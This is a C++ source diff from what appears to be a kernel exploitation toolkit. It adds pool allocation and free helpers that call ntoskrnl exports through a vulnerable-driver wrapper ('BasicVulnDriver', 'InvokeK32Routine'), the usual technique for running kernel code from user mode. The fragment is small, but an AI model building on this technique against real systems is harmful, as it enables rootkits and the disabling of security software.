@@ -4,12 +4,45 @@
 
 #include <psapi.h>
 
-KernelContext::KernelContext(BasicVulnDriver* driver)
+K32Context::K32Context(BasicVulnDriver* driver)
     : driver(driver)
 {
 }
 
-uintptr_t KernelContext::GetK32ModuleAddr(std::string_view moduleName)
+BasicVulnDriver* K32Context::GetDriver()
+{
+    return driver;
+}
+
+uintptr_t K32Context::AllocatePool(POOL_TYPE poolType, std::size_t size)
+{
+    static const auto exAllocPool = GetK32ExportProcAddr("ntoskrnl.exe", "ExAllocatePoolWithTag");
+    if (!exAllocPool) {
+        std::println("[-] Failed to get export proc address");
+        return 0;
+    }
+
+    uintptr_t allocAddress = 0;
+    if (!InvokeK32Routine(&allocAddress, exAllocPool, poolType, size, 'lnrk')) {
+        std::println("[-] Failed to invoke kernel routine");
+        return 0;
+    }
+
+    return allocAddress;
+}
+
+bool K32Context::FreePool(uintptr_t address)
+{
+    static const auto exFreePool = GetK32ExportProcAddr("ntoskrnl.exe", "ExFreePool");
+    if (!exFreePool) {
+        std::println("[-] Failed to get export proc address");
+        return 0;
+    }
+
+    return InvokeK32Routine(exFreePool, address);
+}
+
+uintptr_t K32Context::GetK32ModuleAddr(std::string_view moduleName)
 {
     LPVOID drivers[1024];
     DWORD cbNeeded;
@@ -36,7 +69,7 @@ uintptr_t KernelContext::GetK32ModuleAddr(std::string_view moduleName)
     return 0;
 }
 
-uintptr_t KernelContext::GetK32ExportProcAddr(std::string_view moduleName, std::string_view functionName)
+uintptr_t K32Context::GetK32ExportProcAddr(std::string_view moduleName, std::string_view functionName)
 {
     const auto moduleBaseAddr = GetK32ModuleAddr(moduleName);
     if (!moduleBaseAddr) {
